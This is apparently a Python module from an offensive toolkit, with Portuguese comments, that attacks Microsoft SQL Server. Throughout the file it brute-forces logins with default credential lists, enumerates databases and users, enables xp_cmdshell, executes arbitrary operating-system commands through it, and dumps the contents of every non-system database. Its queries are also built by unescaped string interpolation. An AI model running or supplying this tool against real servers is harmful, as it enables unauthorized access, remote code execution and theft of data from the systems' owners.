# modules/database/mssql.py
import pymssql
import socket
from concurrent.futures import ThreadPoolExecutor
import subprocess
import re

class MSSQLExploiter:
    def __init__(self):
        self.common_users = ['sa', 'admin', 'administrator', 'test', 'user', 'dbadmin']
        self.common_passwords = [
            '', '123456', 'password', 'admin', '12345', 'sa', 'Password1',
            'Welcome1', 'sql', 'mssql', 'database', 'server'
        ]

    def connect_mssql(self, target, port=1433, username=None, password=None, timeout=5):
        """Tenta conexão MSSQL"""
        try:
            conn = pymssql.connect(
                server=target,
                port=port,
                user=username,
                password=password,
                login_timeout=timeout,
                timeout=timeout
            )
            return conn
        except:
            return None

    def brute_force_mssql(self, target, port=1433):
        """Força bruta MSSQL"""
        valid_creds = []
        
        for user in self.common_users:
            for password in self.common_passwords:
                conn = self.connect_mssql(target, port, user, password)
                if conn:
                    valid_creds.append((user, password))
                    print(f"[+] MSSQL Credencial: {user}:{password}")
                    
                    # Obtém informações básicas
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT @@version")
                        version = cursor.fetchone()[0]
                        print(f"    [+] Versão: {version[:100]}...")
                    except:
                        pass
                    
                    conn.close()
        
        return valid_creds

    def get_mssql_info(self, target, port, username, password):
        """Obtém informações do MSSQL"""
        info = {}
        conn = self.connect_mssql(target, port, username, password)
        
        if conn:
            try:
                cursor = conn.cursor()
                
                # Informações da instância
                cursor.execute("SELECT @@version")
                info['version'] = cursor.fetchone()[0]
                
                cursor.execute("SELECT @@servername")
                info['servername'] = cursor.fetchone()[0]
                
                # Bancos de dados
                cursor.execute("SELECT name FROM sys.databases")
                info['databases'] = [row[0] for row in cursor.fetchall()]
                
                # Usuários
                cursor.execute("SELECT name FROM sys.sql_logins")
                info['users'] = [row[0] for row in cursor.fetchall()]
                
                # Configurações
                cursor.execute("SELECT name, value_in_use FROM sys.configurations")
                info['configurations'] = dict(cursor.fetchall())
                
            except Exception as e:
                info['error'] = str(e)
            finally:
                conn.close()
        
        return info

    def enable_xp_cmdshell(self, target, port, username, password):
        """Habilita xp_cmdshell"""
        conn = self.connect_mssql(target, port, username, password)
        if not conn:
            return False
        
        try:
            cursor = conn.cursor()
            commands = [
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            ]
            
            for cmd in commands:
                cursor.execute(cmd)
            
            conn.commit()
            conn.close()
            return True
            
        except Exception as e:
            print(f"[-] Erro ao habilitar xp_cmdshell: {e}")
            return False

    def execute_command(self, target, port, username, password, command):
        """Executa comando via xp_cmdshell"""
        conn = self.connect_mssql(target, port, username, password)
        if not conn:
            return None
        
        try:
            cursor = conn.cursor()
            cursor.execute(f"EXEC xp_cmdshell '{command}'")
            result = cursor.fetchall()
            conn.close()
            
            return '\n'.join([str(row) for row in result if row[0]])
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def dump_database(self, target, port, username, password, database):
        """Faz dump de database específico"""
        conn = self.connect_mssql(target, port, username, password)
        if not conn:
            return None
        
        try:
            cursor = conn.cursor()
            cursor.execute(f"USE {database}")
            
            # Lista tabelas
            cursor.execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES")
            tables = [row[0] for row in cursor.fetchall()]
            
            dump_data = {}
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    dump_data[table] = rows
                except:
                    continue
            
            conn.close()
            return dump_data
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def check_vulnerabilities(self, target, port):
        """Verifica vulnerabilidades comuns do MSSQL"""
        vulns = []
        
        # Verifica se xp_cmdshell está habilitado
        try:
            conn = self.connect_mssql(target, port, 'sa', '')
            if conn:
                cursor = conn.cursor()
                cursor.execute("SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'")
                result = cursor.fetchone()
                if result and result[0] == 1:
                    vulns.append("xp_cmdshell habilitado")
                conn.close()
        except:
            pass
        
        return vulns

    def scan_mssql(self, target, port=1433):
        """Scan completo MSSQL"""
        print(f"[+] Scan MSSQL em: {target}:{port}")
        
        results = {
            'credentials': [],
            'info': {},
            'vulnerabilities': [],
            'databases': []
        }
        
        # Força bruta
        results['credentials'] = self.brute_force_mssql(target, port)
        
        # Se tiver credenciais, obtém mais informações
        if results['credentials']:
            user, password = results['credentials'][0]
            results['info'] = self.get_mssql_info(target, port, user, password)
            
            # Verifica vulnerabilidades
            results['vulnerabilities'] = self.check_vulnerabilities(target, port)
            
            # Tenta dump de databases
            if 'databases' in results['info']:
                for db in results['info']['databases']:
                    if db not in ['master', 'tempdb', 'model', 'msdb']:
                        print(f"    [+] Dump database: {db}")
                        dump = self.dump_database(target, port, user, password, db)
                        if dump and isinstance(dump, dict):
                            results['databases'].append({db: dump})
        
        return results